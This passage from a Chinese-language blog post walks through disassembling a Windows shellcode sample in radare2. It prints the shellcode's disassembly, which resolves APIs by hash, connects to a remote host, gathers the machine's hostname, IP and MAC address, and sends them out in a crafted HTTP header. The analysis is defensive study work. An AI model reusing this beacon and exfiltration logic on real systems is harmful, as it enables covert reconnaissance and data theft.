            <span class="number">0x00000168</span>    <span class="number">56</span>           <span class="keyword">push</span> <span class="literal">esi</span>
            <span class="number">0x00000169</span>    f3a4         <span class="keyword">rep</span> <span class="keyword">movsb</span>
            <span class="number">0x0000016b</span>    b90d000000   <span class="keyword">mov</span> <span class="literal">ecx</span>, <span class="number">0xd</span> <span class="comment">;  0x0000000d </span>
            <span class="number">0x00000170</span>    8db5c4020000 <span class="keyword">lea</span> <span class="literal">esi</span>, [<span class="literal">ebp</span>+<span class="number">0x2c4</span>]
            <span class="number">0x00000176</span>    f3a4         <span class="keyword">rep</span> <span class="keyword">movsb</span>
            <span class="number">0x00000178</span>    89bd4b020000 <span class="keyword">mov</span> [<span class="literal">ebp</span>+<span class="number">0x24b</span>], <span class="literal">edi</span>
            <span class="number">0x0000017e</span>    5e           <span class="keyword">pop</span> <span class="literal">esi</span>
            <span class="number">0x0000017f</span>    <span class="number">56</span>           <span class="keyword">push</span> <span class="literal">esi</span>
            <span class="number">0x00000180</span>    68a9283480   <span class="keyword">push</span> <span class="number">0x803428a9</span> <span class="comment">;  0x803428a9 </span>
            <span class="number">0x00000185</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
</code></pre><p>首先<code>pop ebp</code>将解析器的地址弹入<code>ebp</code>，<code>ebp</code>就指向了所有解析器，显然，之后的一些长十六机制书就是windows API函数的哈希了。我们查查表、跟跟执行流程、看看四处的数据，做做注释，就知道大致怎么回事了。</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; ps @<span class="number">0x00000007</span>+<span class="number">0x2e9</span>
GET /<span class="number">05</span>cea4de-<span class="number">951</span>d-<span class="number">4037</span>-bf8f-f69055b279bb HTTP/<span class="number">1.1</span>\x0d
Host:
[<span class="number">0x00000000</span>]&gt; ps @<span class="number">0x00000007</span>+<span class="number">0x2d1</span>
ws2_32
[<span class="number">0x00000000</span>]&gt; ps @<span class="number">0x00000007</span>+<span class="number">0x2d8</span>
IPHLPAPI
</code></pre><p>当看到一大堆往<code>0x0000010e</code>的类似跳转，猜测大概是处理出错的函数吧，可以注释之。</p>
<p>在函数调用之前(<code>0x0000092</code>)还有个自检查</p>
<pre><code><span class="keyword">cmp</span> <span class="preprocessor">dword</span> [<span class="literal">ebp</span>+<span class="number">0x2e9</span>], <span class="number">0x20544547</span>
<span class="keyword">jne</span> <span class="number">0x10e</span>
</code></pre><p>我们可以看到是看<code>ebp+0x2e9</code>指向的是不是以<code>GET</code>开头：</p>
<pre><code><span class="special">~</span> ⮀ print "<span class="command">\x</span>20<span class="command">\x</span>54<span class="command">\x</span>45<span class="command">\x</span>47"
TEG
</code></pre><p>最后获得的是一个标准的shellcode建立socket流程:</p>
<ol>
<li>通过<code>kernel.dll!LoadlibraryA</code>载入相应dll(<code>ws2_32</code>),这里还载入了<code>IPHLPAPI</code></li>
<li><code>ws2_32.dll!WSAStartup</code>初始化socket</li>
<li><code>ws2_32.dll!WSASocketA</code>建立socket</li>
<li><code>ws2_32.dll!connect</code>连接socket</li>
</ol>
<p>connect返回0时说明连接成功，那么可以知道<code>0x00000104</code>地方的<code>je 0x125</code>跳往的地方应该就是连接成功后要执行的位置了。可以注释下。</p>
<p>注意之后的</p>
<pre><code><span class="number">0x00000106</span>    fe8d89000000 <span class="keyword">dec</span> <span class="preprocessor">byte</span> [<span class="literal">ebp</span>+<span class="number">0x89</span>]
<span class="number">0x0000010c</span>    75e3         <span class="keyword">jne</span> <span class="number">0xf1</span>
</code></pre><p><code>ebp+0x89=0x90</code>，这也是我发现不知道是什么的一个字节。根据紧随其后的一个跳转来看，是一个计数器，看样子是尝试连接5次</p>
<pre><code>[<span class="number">0x00000090</span>]&gt; px <span class="number">1</span>@<span class="number">0x7</span>+<span class="number">0x89</span>
- offset -   <span class="number">0</span> <span class="number">1</span>  <span class="number">2</span> <span class="number">3</span>  <span class="number">4</span> <span class="number">5</span>  <span class="number">6</span> <span class="number">7</span>  <span class="number">8</span> <span class="number">9</span>  A B  C D  E F  <span class="number">0123456789</span>ABCDEF
<span class="number">0x00000090</span>  <span class="number">05</span>
</code></pre><p>如果5次connect都失败了，没有跳转到<code>0x125</code>, 就到了<code>0x10e</code>，就是我们猜测是错误处理的部分。</p>
<pre><code>[<span class="number">0x00000256</span>]&gt; pd <span class="number">10</span>@<span class="number">0x10e</span>
           <span class="number">0x0000010e</span>    <span class="number">80</span>bd4f02000. cmp byte [ebp+<span class="number">0x24f</span>], <span class="number">0x1</span>
       ,=&lt; <span class="number">0x00000115</span>    <span class="number">7407</span>         je <span class="number">0x11e</span>
       |   <span class="number">0x00000117</span>    e83b010000   call <span class="number">0x257</span>
       |      <span class="number">0x00000257</span>()
      ,==&lt; <span class="number">0x0000011c</span>    eb05         jmp <span class="number">0x123</span>
      |`-&gt; <span class="number">0x0000011e</span>    e84d010000   call <span class="number">0x270</span>
      || &gt;    <span class="number">0x00000270</span>()
      `--&gt; <span class="number">0x00000123</span>    ffe7         jmp edi
           <span class="number">0x00000125</span>    b800010000   mov eax, <span class="number">0x100</span> ;  <span class="number">0x00000100</span> 
           <span class="number">0x0000012a</span>    <span class="number">29</span>c4         sub esp, eax
           <span class="number">0x0000012c</span>    <span class="number">89e2</span>         mov edx, esp
           <span class="number">0x0000012e</span>    <span class="number">52</span>           push edx
</code></pre><p>把<code>0x256</code>的字节和1做比较，相等则调用<code>0x270</code>再执行<code>0x123</code>，否则调用<code>0x257</code>然后再跳到<code>0x123</code>。</p>
<p>不知道判断了什么。</p>
<p>我们先看看<code>0x257</code>吧</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x257</span>
           <span class="number">0x00000257</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
           <span class="number">0x0000025d</span>    e8e4ffffff   call <span class="number">0x246</span>
</code></pre><p>载入<code>0x7+0x2e9</code>然后调用<code>0x246</code></p>
<pre><code>[<span class="number">0x00000000</span>]&gt; ps @<span class="number">0x7</span>+<span class="number">0x2e9</span>
GET /<span class="number">05</span>cea4de-<span class="number">951</span>d-<span class="number">4037</span>-bf8f-f69055b279bb HTTP/<span class="number">1.1</span>\x0d
Host: 

[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x246</span>
           <span class="number">0x00000246</span>    <span class="number">31</span>c9         xor ecx, ecx
           <span class="number">0x00000248</span>    f7d1         not ecx
           <span class="number">0x0000024a</span>    <span class="number">31</span>c0         xor eax, eax
           <span class="number">0x0000024c</span>    f2ae         repne scasb
           <span class="number">0x0000024e</span>    f7d1         not ecx
           <span class="number">0x00000250</span>    <span class="number">49</span>           dec ecx
           <span class="number">0x00000251</span>    c3           ret
</code></pre><p><code>0x246</code>，中<code>repne scasb</code>常常用来计算字符串长度。仔细看其实<code>0x246</code>就是<code>strlen</code>。计算结果在<code>ecx</code>中,<code>edi</code>此时指向字符串<code>\0</code>下一个字节。</p>
<p>所以回到<code>0x257</code>:</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x257</span>
           <span class="number">0x00000257</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
           <span class="number">0x0000025d</span>    e8e4ffffff   call <span class="number">0x246</span>
              <span class="number">0x00000246</span>()
           <span class="number">0x00000262</span>    <span class="number">4f</span>           dec edi
           <span class="number">0x00000263</span>    b94f000000   mov ecx, <span class="number">0x4f</span> ;  <span class="number">0x0000004f</span> 
           <span class="number">0x00000268</span>    <span class="number">8</span>db575020000 lea esi, [ebp+<span class="number">0x275</span>]
           <span class="number">0x0000026e</span>    f3a4         rep movsb
           <span class="number">0x00000270</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
           <span class="number">0x00000276</span>    e8cbffffff   call <span class="number">0x246</span>
              <span class="number">0x00000246</span>()
           <span class="number">0x0000027b</span>    c3           ret
</code></pre><p>首先<code>edi</code>减1指向字符串<code>\0</code>位置。</p>
<pre><code><span class="special">[</span>0x00000000<span class="special">]</span>&gt; ps @0x7+0x275
<span class="command">\x</span>0d
Connection: keep-alive<span class="command">\x</span>0d
Accept: */*<span class="command">\x</span>0d
Accept-Encoding: gzip<span class="command">\x</span>0d
<span class="command">\x</span>0d
</code></pre><p>将两个字符串结合起来了。shellcode改变了自己，可以通过<code>ebp+0x2e9</code>获得新的HTTP报头.</p>
<p>难道标志位不相等就构造报头？然后跳转到报头后下一位，我们稍微计算下发现跳转到一堆<code>00</code>上，崩掉了……</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; y <span class="number">0x4f</span> @<span class="number">0x7</span>+<span class="number">0x275</span>
[<span class="number">0x00000000</span>]&gt; e io.cache=<span class="literal">true</span>
[<span class="number">0x00000000</span>]&gt; yy <span class="number">0x32a</span>
[<span class="number">0x00000000</span>]&gt; px @<span class="number">0x32a</span>
- offset -   <span class="number">0</span> <span class="number">1</span>  <span class="number">2</span> <span class="number">3</span>  <span class="number">4</span> <span class="number">5</span>  <span class="number">6</span> <span class="number">7</span>  <span class="number">8</span> <span class="number">9</span>  A B  C D  E F  <span class="number">0123456789</span>ABCDEF
<span class="number">0x0000032a</span>  <span class="number">0</span>d0a <span class="number">436f</span> <span class="number">6e6</span>e <span class="number">6563</span> <span class="number">7469</span> <span class="number">6f</span>6e <span class="number">3</span>a20 <span class="number">6</span>b65  ..Connection: ke
<span class="number">0x0000033a</span>  <span class="number">6570</span> <span class="number">2</span>d61 <span class="number">6</span>c69 <span class="number">7665</span> <span class="number">0</span>d0a <span class="number">4163</span> <span class="number">6365</span> <span class="number">7074</span>  ep-alive..Accept
<span class="number">0x0000034a</span>  <span class="number">3</span>a20 <span class="number">2</span>a2f <span class="number">2</span>a0d <span class="number">0</span>a41 <span class="number">6363</span> <span class="number">6570</span> <span class="number">742</span>d <span class="number">456</span>e  : *<span class="comment">/*..Accept-En
0x0000035a  636f 6469 6e67 3a20 677a 6970 0d0a 0d0a  coding: gzip....
0x0000036a  0083 c70e 31c9 f7d1 31c0 f3ae 4fff e700  ....1...1...O...
0x0000037a  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x0000038a  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x0000039a  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x000003aa  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x000003ba  0090 ffff ffff ffff ffff ffff ffff ffff  ................</span>
</code></pre><p>回到<code>0x10e</code>，我们再看看<code>0x270</code>, 标志位为1发生什么。</p>
<pre><code>[<span class="number">0x00000000</span>]&gt;  pd <span class="number">3</span>@<span class="number">0x270</span>
           <span class="number">0x00000270</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
           <span class="number">0x00000276</span>    e8cbffffff   call <span class="number">0x246</span>
              <span class="number">0x00000246</span>()
           <span class="number">0x0000027b</span>    c3           ret


[<span class="number">0x00000000</span>]&gt;  pd <span class="number">6</span>@<span class="number">0x10e</span>
           <span class="number">0x0000010e</span>    <span class="number">80</span>bd4f02000. cmp byte [ebp+<span class="number">0x24f</span>], <span class="number">0x1</span>
       ,=&lt; <span class="number">0x00000115</span>    <span class="number">7407</span>         je <span class="number">0x11e</span>
       |   <span class="number">0x00000117</span>    e83b010000   call <span class="number">0x257</span>
       |      <span class="number">0x00000257</span>(unk)
      ,==&lt; <span class="number">0x0000011c</span>    eb05         jmp <span class="number">0x123</span>
      |`-&gt; <span class="number">0x0000011e</span>    e84d010000   call <span class="number">0x270</span>
      || &gt;    <span class="number">0x00000270</span>()
      `--&gt; <span class="number">0x00000123</span>    ffe7         jmp edi


[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x270</span>
           <span class="number">0x00000270</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
           <span class="number">0x00000276</span>    e8cbffffff   call <span class="number">0x246</span>
              <span class="number">0x00000246</span>()
           <span class="number">0x0000027b</span>    c3           ret
</code></pre><p>What?计算下报头长度，然后直接跳过去崩掉……</p>
<p>反正只要<code>connect</code>失败就崩了……只不过崩之前干的事情不同，不知道<code>ebp+0x24f</code>是判断啥的标志位。</p>
<p>Ok, 如果<code>connect</code>成功连接。</p>
<pre><code><span class="number">0x00000104</span>    <span class="number">741f</span>         je <span class="number">0x125</span>
</code></pre><p>我们可以看到，从<code>0x125</code>就是<code>gethostname</code>了。</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span> @<span class="number">0x125</span>
           <span class="number">0x00000125</span>    b800010000   mov eax, <span class="number">0x100</span> ;  <span class="number">0x00000100</span> 
           <span class="number">0x0000012a</span>    <span class="number">29</span>c4         sub esp, eax
           <span class="number">0x0000012c</span>    <span class="number">89e2</span>         mov edx, esp
           <span class="number">0x0000012e</span>    <span class="number">52</span>           push edx
           <span class="number">0x0000012f</span>    <span class="number">50</span>           push eax
           <span class="number">0x00000130</span>    <span class="number">52</span>           push edx
           <span class="number">0x00000131</span>    <span class="number">68</span>b649de01   push <span class="number">0x1de49b6</span> ;  <span class="number">0x01de49b6</span> 
           <span class="number">0x00000136</span>    ffd5         call ebp

exercise ● ⮀ python hash.py ws2_32.dll gethostname
[+] Ran on Sat Aug <span class="number">16</span> <span class="number">20</span>:<span class="number">23</span>:<span class="number">44</span> <span class="number">2014</span>

[+] <span class="number">0x01DE49B6</span> = ws2_32.dll!gethostname
</code></pre><p><code>gethostname</code>的结果写入<code>edi</code>中，接着判断如果失败跳到<code>0x239</code>去，不知道是啥。</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x239</span>
       |   <span class="number">0x00000239</span>    <span class="number">53</span>           push ebx
       |   <span class="number">0x0000023a</span>    <span class="number">68756e4</span>d61   push <span class="number">0x614d6e75</span> ;  <span class="number">0x614d6e75</span> 
       |   <span class="number">0x0000023f</span>    ffd5         call ebp
       |      <span class="number">0x00000000</span>(unk, unk, unk) ; name
</code></pre><p>这个hash是<code>&quot;ws2_32.dll!closesocket&quot;</code>那么就很显然是关闭socket的函数了.</p>
<p>我们回到之前<code>gethostname</code>地方：</p>
<pre><code>  ,=&lt; <span class="number">0x00000141</span>    <span class="number">0f</span>85f2000000 jne <span class="number">0x239</span>
 |   <span class="number">0x00000147</span>    <span class="number">57</span>           push edi
 |   <span class="number">0x00000148</span>    e8f9000000   call <span class="number">0x246</span>
 |      <span class="number">0x00000246</span>(unk) ; <span class="built_in">strlen</span>
 |   <span class="number">0x0000014d</span>    <span class="number">5</span>e           pop esi
 |   <span class="number">0x0000014e</span>    <span class="number">89</span>ca         mov edx, ecx
 |   <span class="number">0x00000150</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
 |   <span class="number">0x00000156</span>    e8eb000000   call <span class="number">0x246</span>
 |      <span class="number">0x00000246</span>() ; <span class="built_in">strlen</span>
 |   <span class="number">0x0000015b</span>    <span class="number">4f</span>           dec edi
 |   <span class="number">0x0000015c</span>    <span class="number">83f</span>a20       cmp edx, <span class="number">0x20</span>
,==&lt; <span class="number">0x0000015f</span>    <span class="number">7</span>c05         jl <span class="number">0x166</span>
</code></pre><p>接下来，又是计算字符串长度，判断之前<code>gethostname</code>结果是否等于32,如果比32小则跳转到<code>0x166</code>, 如果大于32则将edx设置成32。而<code>0x166</code>开始又是之前我们分析过的拼接字符串的部分。</p>
<pre><code>[<span class="number">0x00000246</span>]&gt; pd <span class="number">7</span>@<span class="number">0x166</span>
           <span class="number">0x00000166</span>    89d1         <span class="keyword">mov</span> <span class="literal">ecx</span>, <span class="literal">edx</span>
           <span class="number">0x00000168</span>    <span class="number">56</span>           <span class="keyword">push</span> <span class="literal">esi</span>
           <span class="number">0x00000169</span>    f3a4         <span class="keyword">rep</span> <span class="keyword">movsb</span>
           <span class="number">0x0000016b</span>    b90d000000   <span class="keyword">mov</span> <span class="literal">ecx</span>, <span class="number">0xd</span> <span class="comment">;  0x0000000d </span>
           <span class="number">0x00000170</span>    8db5c4020000 <span class="keyword">lea</span> <span class="literal">esi</span>, [<span class="literal">ebp</span>+<span class="number">0x2c4</span>]
           <span class="number">0x00000176</span>    f3a4         <span class="keyword">rep</span> <span class="keyword">movsb</span>
           <span class="number">0x00000178</span>    89bd4b020000 <span class="keyword">mov</span> [<span class="literal">ebp</span>+<span class="number">0x24b</span>], <span class="literal">edi</span>
</code></pre><p>就是把<code>gethostname</code>的结果拼接到<code>HOST</code>字段上。</p>
<pre><code>[<span class="number">0x00000246</span>]&gt; ps @<span class="number">0x7</span>+<span class="number">0x2c4</span>
\x0d
Cookie: ID=ws2_32
[<span class="number">0x00000246</span>]&gt; ps @<span class="number">0x7</span>+<span class="number">0x2e9</span>
GET /<span class="number">05</span>cea4de-<span class="number">951</span>d-<span class="number">4037</span>-bf8f-f69055b279bb HTTP/<span class="number">1.1</span>\x0d
Host: 
</code></pre><p>同时<code>gethostname</code>获取的结果保存到堆栈上，最后弹出，调用<code>gethostbyname</code>。</p>
<pre><code>[<span class="number">0x00000246</span>]&gt; pd <span class="number">10</span>@<span class="number">0x179</span>
           <span class="number">0x00000179</span>    bd4b020000   mov ebp, <span class="number">0x24b</span> ;  <span class="number">0x0000024b</span> 
           <span class="number">0x0000017e</span>    <span class="number">5</span>e           pop esi
           <span class="number">0x0000017f</span>    <span class="number">56</span>           push esi
           <span class="number">0x00000180</span>    <span class="number">68</span>a9283480   push <span class="number">0x803428a9</span> ;  <span class="number">0x803428a9</span> 
           <span class="number">0x00000185</span>    ffd5         call ebp
              <span class="number">0x00000000</span>(unk, unk) ; name
           <span class="number">0x00000187</span>    <span class="number">85</span>c0         test eax, eax

% python hash.py ws2_32.dll gethostbyname
[+] Ran on Tue Aug <span class="number">19</span> <span class="number">16</span>:<span class="number">16</span>:<span class="number">21</span> <span class="number">2014</span>

[+] <span class="number">0x803428A9</span> = ws2_32.dll!gethostbyname
</code></pre><p>两次检查结果确认返回了正确的结果，</p>
<p>紧接着，准备数据，调用<code>sendARP</code>获取mac地址</p>
<pre><code>% python hash.py iphlpapi.dll SendARP             
[+] Ran on Tue Aug <span class="number">19</span> <span class="number">16</span>:<span class="number">21</span>:<span class="number">37</span> <span class="number">2014</span>

[+] <span class="number">0xB8D27248</span> = iphlpapi.dll!SendARP


  ||   <span class="number">0x0000019d</span>    8d400c       <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">eax</span>+<span class="number">0xc</span>]
  ||   <span class="number">0x000001a0</span>    8b00         <span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">eax</span>]
  ||   <span class="number">0x000001a2</span>    8b08         <span class="keyword">mov</span> <span class="literal">ecx</span>, [<span class="literal">eax</span>]
  ||   <span class="number">0x000001a4</span>    8b09         <span class="keyword">mov</span> <span class="literal">ecx</span>, [<span class="literal">ecx</span>]
  ||   <span class="number">0x000001a6</span>    b800010000   <span class="keyword">mov</span> <span class="literal">eax</span>, <span class="number">0x100</span> <span class="comment">;  0x00000100 </span>
  ||   <span class="number">0x000001ab</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
  ||   <span class="number">0x000001ac</span>    89e7         <span class="keyword">mov</span> <span class="literal">edi</span>, <span class="literal">esp</span>
  ||   <span class="number">0x000001ae</span>    29c4         <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="literal">eax</span>
  ||   <span class="number">0x000001b0</span>    89e6         <span class="keyword">mov</span> <span class="literal">esi</span>, <span class="literal">esp</span>
  ||   <span class="number">0x000001b2</span>    <span class="number">57</span>           <span class="keyword">push</span> <span class="literal">edi</span>
  ||   <span class="number">0x000001b3</span>    <span class="number">56</span>           <span class="keyword">push</span> <span class="literal">esi</span>
  ||   <span class="number">0x000001b4</span>    <span class="number">51</span>           <span class="keyword">push</span> <span class="literal">ecx</span>
  ||   <span class="number">0x000001b5</span>    <span class="number">51</span>           <span class="keyword">push</span> <span class="literal">ecx</span>
  ||   <span class="number">0x000001b6</span>    684872d2b8   <span class="keyword">push</span> <span class="number">0xb8d27248</span> <span class="comment">;  sendARP </span>
  ||   <span class="number">0x000001bb</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
</code></pre><p>根据msdn上看到的，<code>edi</code>指向mac地址的长度。接下来比较mac地址是否是六个字节，如果不是……我们之前看到了0x239是<code>closesocket</code></p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x1bf</span>
           <span class="number">0x000001bf</span>    <span class="number">81</span>c404010000 add esp, <span class="number">0x104</span>
           <span class="number">0x000001c5</span>    <span class="number">0f</span>b70f       movzx ecx, word [edi]
           <span class="number">0x000001c8</span>    <span class="number">83f</span>906       cmp ecx, <span class="number">0x6</span>
       ,=&lt; <span class="number">0x000001cb</span>    <span class="number">726</span>c         jb <span class="number">0x239</span>
</code></pre><p>接下来这个乍一看让人困惑，在栈上分配空间，还干了一堆不知道干什么的。</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">32</span>@<span class="number">0x1cd</span>
|          <span class="number">0x000001cd</span>    b906000000   mov ecx, <span class="number">0x6</span> ;  <span class="number">0x00000006</span> 
|          <span class="number">0x000001d2</span>    b810000000   mov eax, <span class="number">0x10</span> ;  <span class="number">0x00000010</span> 
|          <span class="number">0x000001d7</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x000001d9</span>    <span class="number">89e7</span>         mov edi, esp
|          <span class="number">0x000001db</span>    <span class="number">89</span>ca         mov edx, ecx
|          <span class="number">0x000001dd</span>    d1e2         shl edx, <span class="number">1</span>
|          <span class="number">0x000001df</span>    <span class="number">50</span>           push eax
|          <span class="number">0x000001e0</span>    <span class="number">52</span>           push edx
|          ; JMP XREF from <span class="number">0x0000020b</span> (fcn<span class="number">.00000090</span>)
|  .-----&gt; <span class="number">0x000001e1</span>    <span class="number">31</span>d2         xor edx, edx
|  |       <span class="number">0x000001e3</span>    <span class="number">8</span>a16         mov dl, [esi]
|  |       <span class="number">0x000001e5</span>    <span class="number">88</span>d0         mov al, dl
|  |       <span class="number">0x000001e7</span>    <span class="number">24f</span>0         and al, <span class="number">0xf0</span>
|  |       <span class="number">0x000001e9</span>    c0e804       shr al, <span class="number">0x4</span>
|  |       <span class="number">0x000001ec</span>    <span class="number">3</span>c09         cmp al, <span class="number">0x9</span>
|  |   ,=&lt; <span class="number">0x000001ee</span>    <span class="number">7704</span>         ja <span class="number">0x1f4</span>
|  |   |   <span class="number">0x000001f0</span>    <span class="number">0430</span>         add al, <span class="number">0x30</span>
|  |  ,==&lt; <span class="number">0x000001f2</span>    eb02         jmp <span class="number">0x1f6</span> ; (fcn<span class="number">.00000090</span>)
|  |  ||   ; JMP XREF from <span class="number">0x000001ee</span> (fcn<span class="number">.00000090</span>)
|  |  |`-&gt; <span class="number">0x000001f4</span>    <span class="number">0437</span>         add al, <span class="number">0x37</span>
|  |  |    ; JMP XREF from <span class="number">0x000001f2</span> (fcn<span class="number">.00000090</span>)
|  |  `--&gt; <span class="number">0x000001f6</span>    <span class="number">8807</span>         mov [edi], al
|  |       <span class="number">0x000001f8</span>    <span class="number">47</span>           inc edi
|  |       <span class="number">0x000001f9</span>    <span class="number">88</span>d0         mov al, dl
|  |       <span class="number">0x000001fb</span>    <span class="number">240f</span>         and al, <span class="number">0xf</span>
|  |       <span class="number">0x000001fd</span>    <span class="number">3</span>c09         cmp al, <span class="number">0x9</span>
|  | ,===&lt; <span class="number">0x000001ff</span>    <span class="number">7704</span>         ja <span class="number">0x205</span>
|  | |     <span class="number">0x00000201</span>    <span class="number">0430</span>         add al, <span class="number">0x30</span>
|  |,====&lt; <span class="number">0x00000203</span>    eb02         jmp <span class="number">0x207</span> ; (fcn<span class="number">.00000090</span>)
|  |||     ; JMP XREF from <span class="number">0x000001ff</span> (fcn<span class="number">.00000090</span>)
|  ||`---&gt; <span class="number">0x00000205</span>    <span class="number">0437</span>         add al, <span class="number">0x37</span>
|  ||      ; JMP XREF from <span class="number">0x00000203</span> (fcn<span class="number">.00000090</span>)
|  |`----&gt; <span class="number">0x00000207</span>    <span class="number">8807</span>         mov [edi], al
|  |       <span class="number">0x00000209</span>    <span class="number">47</span>           inc edi
|  |       <span class="number">0x0000020a</span>    <span class="number">46</span>           inc esi
|  `=====&lt; <span class="number">0x0000020b</span>    e2d4         loop <span class="number">0x1e1</span>
|          <span class="number">0x0000020d</span>    <span class="number">59</span>           pop ecx
</code></pre><p>后来看看原来如此</p>
<pre><code>In [<span class="number">9</span>]: chr(<span class="number">10</span>+<span class="number">0x37</span>)
Out[<span class="number">9</span>]: <span class="string">'A'</span>

In [<span class="number">10</span>]: chr(<span class="number">9</span>+<span class="number">0x30</span>)
Out[<span class="number">10</span>]: <span class="string">'9'</span>
</code></pre><p>原来是把mac地址转换成可打印字符。</p>
<p>下一步，估计就是放进http报头中发送了。</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x0000020d</span>
|          <span class="number">0x0000020d</span>    <span class="number">59</span>           <span class="keyword">pop</span> <span class="literal">ecx</span>
|          <span class="number">0x0000020e</span>    29cf         <span class="keyword">sub</span> <span class="literal">edi</span>, <span class="literal">ecx</span>
|          <span class="number">0x00000210</span>    89fe         <span class="keyword">mov</span> <span class="literal">esi</span>, <span class="literal">edi</span>
|          <span class="number">0x00000212</span>    <span class="number">58</span>           <span class="keyword">pop</span> <span class="literal">eax</span>
|          <span class="number">0x00000213</span>    01c4         <span class="keyword">add</span> <span class="literal">esp</span>, <span class="literal">eax</span>
|          <span class="number">0x00000215</span>    8bbd4b020000 <span class="keyword">mov</span> <span class="literal">edi</span>, [<span class="literal">ebp</span>+<span class="number">0x24b</span>]
|          <span class="number">0x0000021b</span>    f3a4         <span class="keyword">rep</span> <span class="keyword">movsb</span>
|          <span class="number">0x0000021d</span>    c6854f02000. <span class="keyword">mov</span> <span class="preprocessor">byte</span> [<span class="literal">ebp</span>+<span class="number">0x24f</span>], <span class="number">0x1</span> <span class="comment">;  0x00000001 </span>
|          <span class="number">0x00000224</span>    e82e000000   <span class="keyword">call</span> <span class="number">0x257</span> <span class="comment">; (fcn.00000252)</span>
|             fcn<span class="string">.00000252</span>()
|          <span class="number">0x00000229</span>    31c0         <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
</code></pre><p>果然是，调用<code>0x257</code>拼接报头。</p>
<p>之后，</p>
<pre><code>[<span class="number">0x00000252</span>]&gt; pd <span class="number">10</span>@<span class="number">0x00000229</span>
|          <span class="number">0x00000229</span>    <span class="number">31</span>c0         xor eax, eax
|          <span class="number">0x0000022b</span>    <span class="number">50</span>           push eax
|          <span class="number">0x0000022c</span>    <span class="number">51</span>           push ecx
|          <span class="number">0x0000022d</span>    <span class="number">29</span>cf         sub edi, ecx
|          <span class="number">0x0000022f</span>    <span class="number">4f</span>           dec edi
|          <span class="number">0x00000230</span>    <span class="number">57</span>           push edi
|          <span class="number">0x00000231</span>    <span class="number">53</span>           push ebx
|          <span class="number">0x00000232</span>    <span class="number">68</span>c2eb385f   push <span class="number">0x5f38ebc2</span> ;  ws2_32!send 
|          <span class="number">0x00000237</span>    ffd5         call ebp
|             fcn<span class="number">.00000000</span>(unk, unk, unk, unk, unk)
|          ; JMP XREF from <span class="number">0x00000141</span> (fcn<span class="number">.00000090</span>)
|          ; JMP XREF from <span class="number">0x00000189</span> (fcn<span class="number">.00000090</span>)
|          ; JMP XREF from <span class="number">0x00000197</span> (fcn<span class="number">.00000090</span>)
|          ; JMP XREF from <span class="number">0x000001cb</span> (fcn<span class="number">.00000090</span>)
|          ;-- closesocket:
|          <span class="number">0x00000239</span>    <span class="number">53</span>           push ebx
</code></pre><p>显然将报头send出去了。</p>
<p>最后，关闭socket连接。然后跳回<code>0x10e</code>构造报头然后崩溃……</p>
<pre><code>[<span class="number">0x00000252</span>]&gt; pd <span class="number">10</span>@<span class="number">0x00000239</span>
|      |   ; JMP XREF from <span class="number">0x00000141</span> (fcn<span class="number">.00000090</span>)
|      |   ; JMP XREF from <span class="number">0x00000189</span> (fcn<span class="number">.00000090</span>)
|      |   ; JMP XREF from <span class="number">0x00000197</span> (fcn<span class="number">.00000090</span>)
|      |   ; JMP XREF from <span class="number">0x000001cb</span> (fcn<span class="number">.00000090</span>)
|      |   ;-- closesocket:
|      |   <span class="number">0x00000239</span>    <span class="number">53</span>           push ebx
|      |   <span class="number">0x0000023a</span>    <span class="number">68756e4</span>d61   push <span class="number">0x614d6e75</span> ;  <span class="number">0x614d6e75</span> 
|      |   <span class="number">0x0000023f</span>    ffd5         call ebp
|      |      fcn<span class="number">.00000000</span>(unk, unk, unk)
\      `=&lt; <span class="number">0x00000241</span>    e9c8feffff   jmp <span class="number">0x10e</span> ; (fcn<span class="number">.00000090</span>)
</code></pre><p>至此这个shellcode大致做了什么就比较清晰了。与远程主机建立连接，将计算机的机器名获取，又获取IP地址和MAC地址，然后构造HTTP报头发送给远端的机器。</p>
<p>要更加清晰的知道shellcode在干什么，最好还是动态方式调试下。当然得写个测试shellcode的程序了，好像radare2有调试功能……不会用，唉，标记都用不好。</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/exploit/2014/08/08/defeating-ioli-with-radare2/" itemprop="url">
                  Defeating ioli with radare2
                </a>
              
            
          </h1>
        

        <div class="post-meta">
